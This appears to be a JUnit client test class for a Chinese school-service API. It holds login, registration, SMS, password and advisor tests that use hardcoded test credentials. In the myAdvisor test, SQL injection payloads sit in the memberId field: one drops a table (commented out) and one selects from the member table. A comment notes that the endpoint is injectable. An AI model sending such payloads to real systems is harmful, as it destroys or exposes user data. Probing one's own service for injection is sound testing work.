package cn.emay;

import java.io.File;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.nio.charset.Charset;
import java.text.ParseException;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Map;

import org.apache.commons.lang3.StringUtils;
import org.apache.http.HttpEntity;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.client.methods.RequestBuilder;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.junit.Test;
import org.nutz.json.Json;
import org.nutz.lang.Files;

import cn.emay.common.client.LocalHttpClient;
import cn.emay.common.response.ResponeResultClasses;
import cn.emay.common.response.ResponeResultModel;
import cn.emay.common.response.ResponeResultSchool;
import cn.emay.common.util.DateUtils;
import cn.emay.common.util.PostParamsModel;
import cn.emay.common.util.SignatureUtils;


public class ClientTest {

//	static String BASE_URI="http://localhost:8080/SchoolService";
	static String BASE_URI="http://172.16.1.88:8989/SchoolService";
//	static String BASE_URI="http://124.127.89.41/SchoolService";
//	static String BASE_URI="http://localhost:8080/SchoolService";
//	static String BASE_URI="http://y.ssjyw.cn/SchoolService";
//	static String BASE_URI="http://app.malongren.com:8080/SchoolService";
	static String url="http://172.16.1.88:8989/drugsafe/api/operation/login";
	
	
	@Test
	public void findMember(){
		PostParamsModel params=new PostParamsModel();
		params.setNonce("11313");
		params.setPostData("{mobilephone:\"13161454672\"}");
		params.setSiteId("zjl");
		String signature=SignatureUtils.getSignature("zjlwm", params.getPostData(), params.getNonce());
		System.err.println(signature);
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/member/findMember")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("utf-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
		
//		
//		Map<String,Object>reponseData=result.getData();
//		
//		String memberJson=reponseData.get("member").toString();
//		System.out.println(memberJson);
		
	}
	@Test
	public   void login(){
		PostParamsModel params=new PostParamsModel();
		params.setNonce("11313");          
//		params.setPostData("{mobilephone:\"13027511199\",password:\"123456\"}");
//		params.setPostData("{mobilephone:\"13161454672\",password:\"123456\",userType:\"1\"}");
		params.setPostData("{mobilephone:\"advisertwo\",password:\"123456\",userType:\"2\"}");
		
//		params.setPostData("{mobilephone:\"15188387501\",password:\"123456\",userType:\"1\"}");
		params.setSiteId("zjl");
		String signature=SignatureUtils.getSignature("zjlwm", params.getPostData(), params.getNonce());
		System.err.println(signature);
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/member/login")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("utf-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	
	@Test
	public   void login2(){
		PostParamsModel params=new PostParamsModel();
		params.setNonce("11313");
		params.setPostData("{username:\"zhangjialu\",password:\"123456\"}");
		String signature=SignatureUtils.getSignature("zjlwm", params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri("http://127.0.0.1:8080/tianrui/api/service/login")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("utf-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	
	@Test
	public   void login3(){
		PostParamsModel params=new PostParamsModel();
		params.setNonce("11313");
//		params.setPostData("{mobilephone:\"13412311231\",password:\"123456\",userType:\"2\"}");
		params.setPostData("{mobilephone:\"13211111113\",password:\"123\",userType:\"2\"}");
//		params.setPostData("{mobilephone:\"18500135186\",password:\"123456\",userType:\"1\"}");
		String signature=SignatureUtils.getSignature("zjlwm", params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/member/login")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("utf-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	/**
	 * 会员信息保存测试
	 */
	@Test
	public   void saveMember(){
		String ddd="{\"mobilephone\":\"13161454672\",sms:\"819701\",\"name\":\"zjlwm002\",\"password\":\"123456\",\"studentList\":[{\"classId\":\"32525d0323694358b1ebf1295a03483e\",\"gender\":\"1\",\"gradeDict\":\"1\",\"schoolId\":\"899a7b3e14184644bddb610decef816a\",\"studentName\":\"leer\"}]}";
		PostParamsModel params=new PostParamsModel();
		params.setNonce("11313");
		params.setPostData(ddd);
		params.setSiteId("张");
		String signature=SignatureUtils.getSignature("zjlwm", params.getPostData(), params.getNonce());
		System.err.println(signature);
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/register/saveMember")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("utf-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	/**
	 * 会员信息保存测试
	 */
	@Test
	public   void saveCmsMember(){
		String ddd="{\"mobilephone\":\"13121165245\",\"name\":\"zjlwm002\",\"password\":\"123456\",\"studentList\":[{\"classId\":\"32525d0323694358b1ebf1295a03483e\",\"gender\":\"1\",\"gradeDict\":\"1\",\"schoolId\":\"899a7b3e14184644bddb610decef816a\",\"studentName\":\"leer\"}]}";
		PostParamsModel params=new PostParamsModel();
		params.setNonce("11313");
		params.setPostData(ddd);
		params.setSiteId("张");
		String signature=SignatureUtils.getSignature("zjlwm", params.getPostData(), params.getNonce());
		System.err.println(signature);
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/register/saveCmsMember")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("utf-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	
	/**
	 * 会员信息保存
	 */
	@Test
	public void saveMember2(){
		String accessToken="zjlwm";
		String siteId="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{memeer:Id,name:\"张家路\"}");
		params.setSiteId(siteId);
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/register/saveMember")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	@Test
	public void validateMobile(){
		String accessToken="zjlwm";
		String siteId="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{mobilephone:\""+"13161454671"+"\"}");
		params.setSiteId(siteId);
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/register/validateMobile")//http://app.malongren.com:8080/SchoolService/service/register/validateMobile
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	/** 
     * post方式提交表单（模拟用户登录请求） 
     */  
	@Test
    public void postForm() {  
        // 创建默认的httpClient实例.    
        CloseableHttpClient httpclient = HttpClients.createDefault();  
        // 创建httppost    
        HttpPost httppost = new HttpPost(BASE_URI+"/service/register/saveMember");  
        // 创建参数队列    
        List<NameValuePair> formparams = new ArrayList<NameValuePair>();  
        formparams.add(new BasicNameValuePair("username", "admin"));  
        formparams.add(new BasicNameValuePair("password", "123456"));  
        UrlEncodedFormEntity uefEntity;  
        try {  
            uefEntity = new UrlEncodedFormEntity(formparams, "UTF-8");  
            httppost.setEntity(uefEntity);  
            System.out.println("executing request " + httppost.getURI());  
            CloseableHttpResponse response = httpclient.execute(httppost);  
            try {  
                HttpEntity entity = response.getEntity();  
                if (entity != null) {  
                    System.out.println("--------------------------------------");  
                    System.out.println("Response content: " + EntityUtils.toString(entity, "UTF-8"));  
                    System.out.println("--------------------------------------");  
                }  
            } finally {  
                response.close();  
            }  
        } catch (ClientProtocolException e) {  
            e.printStackTrace();  
        } catch (UnsupportedEncodingException e1) {  
            e1.printStackTrace();  
        } catch (IOException e) {  
            e.printStackTrace();  
        } finally {  
            // 关闭连接,释放资源    
            try {  
                httpclient.close();  
            } catch (IOException e) {  
                e.printStackTrace();  
            }  
        }  
    }  
	
	
	/**
	 * 查找年级
	 */
	@Test
	public  void findGrade(){
		String accessToken="zjlwm";
		String siteId="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{}");
		params.setSiteId(siteId);
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/school/findGrade")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	/**
	 * 班级查找
	 */
	@Test
	public  void findClasses(){
		String accessToken="zjlwm";
		String siteId="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{schoolId:\""+"d923a284e4f044758576542bbfb06e90"+"\", gradeCode:\""+2+"\"}");
		params.setSiteId(siteId);
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/school/findClasses")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultClasses result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultClasses.class);
		System.out.println(Json.toJson(result));
	}
	
	
	/*
	 * 发送验证码
	 */
	@Test
	public void sendSMS(){
		String accessToken="zjlwm";
		String siteId="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{memberId:\""+"f33bc2a8da7c4d699e663677f8a32a3f"+"\"}");
		params.setSiteId(siteId);
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/register/sendSMS")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultClasses result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultClasses.class);
		System.out.println(Json.toJson(result));
	}
	
	
	/**
	 * 学生查询
	 */
	@Test
	public void sendSMS2(){
		String accessToken="zjlwm";
		String siteId="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{memberId:\"f33bc2a8da7c4d699e663677f8a32a3f\",mobilephone:\"13161454672\"}");
		params.setSiteId(siteId);
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/register/sendSMS")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	/**
	 * 验证短信码
	 */
	@Test
	public void validateSMS(){
		String accessToken="zjlwm";
		String siteId="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{memberId:\""+"6db55e8228a2484a8f5936cc4b2f523c"+"\",sms:\"399972\"}");
		params.setSiteId(siteId);
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/register/validateSMS")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultClasses result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultClasses.class);
		System.out.println(Json.toJson(result));
	}
	
	/**
	 * 修改密码接口验证
	 */
	@Test
	public void modifyPassword(){
		String accessToken="zjlwm";
		String siteId="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{oldPassword:\""+"123456"+"\",password:\"123456\",memberId:\"f33bc2a8da7c4d699e663677f8a32a3f\"}");
		params.setSiteId(siteId);
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/member/modifyPassword")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultClasses result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultClasses.class);
		System.out.println(Json.toJson(result));
	}
	
	
	
	/**
	 * 所有会员数据查询
	 */
	@Test
	public void memberSynchronouse(){
		String accessToken="zjlwm";
		String siteId="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{}");
		params.setSiteId(siteId);
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/cms/synchronouse/member")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	
	/**
	 * 下载统计
	 */
	@Test
	public void downloads(){
		String accessToken="zjlwm";
		String siteId="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{type:\"Android\",deviceId:\"1310-0000-87889\"}");
		params.setSiteId(siteId);
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/statistics/downloads")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	
	/**
	 * 通讯录接口
	 * f33bc2a8da7c4d699e663677f8a32a3f 家长
	 * 3e0620f7768948c18bdcee24f890cce1
	 */
	@Test
	public void addressList(){
		String accessToken="zjlwm";
		String siteId="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");//
//		params.setPostData("{memberId:\"3e49096c277f415b951decc2c880dc19\",userType:\"2\"}");//顾问--默认
		
		params.setPostData("{memberId:\"0a6118f1226c4c04a1ba90ab0cd9a143\",userType:\"1\"}");
//		params.setPostData("{memberId:\"f33bc2a8da7c4d699e663677f8a32a3f\",userType:\"1\"}");//f33bc2a8da7c4d699e663677f8a32a3f
//		params.setPostData("{memberId:\"a7ee38d6352e42919d5e0b9e08ffc0d6\",userType:\"2\"}");//f33bc2a8da7c4d699e663677f8a32a3f
		params.setSiteId(siteId);
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/addressList/list2")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	
	@Test
	public void addressList2(){
		String accessToken="zjlwm";
		String siteId="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
//		params.setPostData("{memberId:\"630d9392ed6540da96f92907151dc3b7\"}");//f33bc2a8da7c4d699e663677f8a32a3f
//		params.setPostData("{memberId:\"e15ef6147fce452b80ab8a5b23089d1e\"}");//f33bc2a8da7c4d699e663677f8a32a3f
		params.setPostData("{memberId:\"3e0620f7768948c18bdcee24f890cce1\",userType:\"2\"}");//f33bc2a8da7c4d699e663677f8a32a3f
		params.setSiteId(siteId);
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/addressList/list2")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	/**
	 * 学校查找接口
	 */
	@Test
	public void findSchool(){
		String accessToken="zjlwm";
		String siteId="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{areaId:301}");//f33bc2a8da7c4d699e663677f8a32a3f
		params.setSiteId(siteId);
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/school/findSchool")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultSchool result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultSchool.class);
		System.out.println(Json.toJson(result));
	}
	
	
	
	
	/**
	 * 每周主题
	 */
	@Test
	public void gradeTheme(){
		String accessToken="zjlwm";
		String siteId="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{gradeCode:\"4\"}");//f33bc2a8da7c4d699e663677f8a32a3f
//		params.setPostData("{gradeCode:\"5,6,10,11,12,4\"}");
		
		params.setSiteId(siteId);
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/push/gradeTheme/list")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	/**
	 * 活动推送记录查询
	 */
	@Test
	public void activityList(){
		String accessToken="zjlwm";
		String siteId="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{gradeCode:\"4\"}");//f33bc2a8da7c4d699e663677f8a32a3f
		params.setSiteId(siteId);
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/push/activity/list")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	
	/**
	 * 学生查询
	 */
	@Test
	public void findStudentList(){
		String accessToken="zjlwm";
		String siteId="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{memberId:\"f33bc2a8da7c4d699e663677f8a32a3f\"}");
		params.setSiteId(siteId);
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/member/findStudentList")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	
	
	/**
	 * 密码重置
	 */
	@Test
	public void restPassword(){
		String accessToken="zjlwm";
		String siteId="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{sms:\"952270\"password:\"1234567\",mobilephone:\"13161454672\"}");
		params.setSiteId(siteId);
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/member/resetPassword")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	
	/**
	 * 会员不存在
	 */
	@Test
	public void existsMember(){
		String accessToken="zjlwm";
		String siteId="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{mobilephone:\"13161454672\"}");
		params.setSiteId(siteId);
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/member/existsMember")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	/**
	 * 会员注册到环信平台
	 */
	@Test
	public void IMUsersRegist(){
		String accessToken="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{mobilephone:\"13161454777\",hxId:\"133\",nickname:\"顾问\"}");
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/member/IMUsersRegist")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	/**
	 * 添加好友
	 */
	@Test
	public void addfriend(){
		String accessToken="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{ownerUserName:\"13161454672\",friendUserName:\"18658227291\"}");
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/insMessaging/addfriend")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	@Test
	public void addfriend2(){
		String accessToken="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{ownerUserName:\"13412311231\",friendUserName:\"18658227292\"}");
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/insMessaging/addfriend")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	/**
	 * 
	 * 可以注入sql删除语句 顾问查询接口
	 * 我的的顾问
	 */
	@Test
	public void myAdvisor(){
		String accessToken="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
//		params.setPostData("{memberId:\"1';drop table app_ad--\"}");
		params.setPostData("{memberId:\"1';(select (*) from s_member)--\"}");
//		params.setPostData("{memberId:\"f33bc2a8da7c4d699e663677f8a32a3f\"}");
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/member/myAdvisor")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	/**
	 * 顾问发布学习内容
	 */
	@Test
	public void addPublishLearning(){
		String accessToken="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
//		params.setPostData("{memberId:\"a7ee38d6352e42919d5e0b9e08ffc0d6\",title:\"发布学习内容2\",content:\"发布学习内容咯，复习资料2\",type:2,areaId:\"6agewgwge\"}");
		params.setPostData("{\"areaId\":\"4063\",\"content\":\"qqqqqq\",\"memberId\":\"3e0620f7768948c18bdcee24f890cce1\",\"title\":\"qqqqqq\",\"type\":\"1\"}");
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/consultant/publishLearning/add")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	/**
	 * 
	 * 可以注入SQL语句  顾问查询接口
	 * 顾问发布学习内容
	 */
	@Test
	public void findPublishLearning(){
		String accessToken="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{memberId:\"8665af7a4fe243098bca8d99bfed3140\",gradeCode:\"4\"}");
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/consultant/publishLearning/list")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	
	/**
	 * 家长提醒内容添加
	 */
	@Test
	public void addStudentRemind(){
		String accessToken="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{memberId:\"a7ee38d6352e42919d5e0b9e08ffc0d6\",content:\"发布学习内容2\",remindDate:\"2015-07-10 12:33\"}");
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/consultant/studentRemind/add")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	/**
	 * 学生提醒内容查询
	 */
	@Test
	public void findStudentRemind(){
		String accessToken="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{memberId:\"a7ee38d6352e42919d5e0b9e08ffc0d6\",adviserId:\"dd\"}");
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/consultant/studentRemind/list")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
	}
	
	
	/**
	 * 顾问对家长备注添加
	 */
	@Test
	public void addStudentRemarks(){
		String accessToken="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
		params.setPostData("{memberId:\"a7ee38d6352e42919d5e0b9e08ffc0d6\",remarks:\"发布学习内容2\"}");
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/consultant/studentRemarks/add")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
